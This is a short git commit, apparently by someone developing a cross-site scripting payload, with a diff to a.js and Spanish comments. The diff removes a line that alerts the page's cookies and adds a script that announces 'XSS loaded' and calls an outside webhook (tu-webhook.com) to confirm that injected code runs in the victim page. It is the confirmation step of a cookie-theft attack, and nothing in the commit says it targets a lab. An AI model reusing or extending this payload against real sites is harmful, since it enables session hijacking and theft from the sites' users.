60e5865c789d63a25ee41210603798750ef679ab
No-Blip <mebloquearonlacuenta@gmail.com>
2026-03-28 00:09:40 -0400

    hf

--- a.js
+++ a.js
@@ -1,1 +1,10 @@
-alert(document.cookie);
+// Diagnóstico simple
+console.log("--- SCRIPT XSS CARGADO ---");
+
+// Intentamos enviar un 'ping' al webhook
+fetch('https://tu-webhook.com/debug?status=funciona')
+  .then(() => console.log("Petición enviada al webhook"))
+  .catch((err) => console.error("Error al contactar el webhook:", err));
+
+// También un alert para confirmar ejecución visual
+alert("Script ejecutado. Revisa tu webhook.");
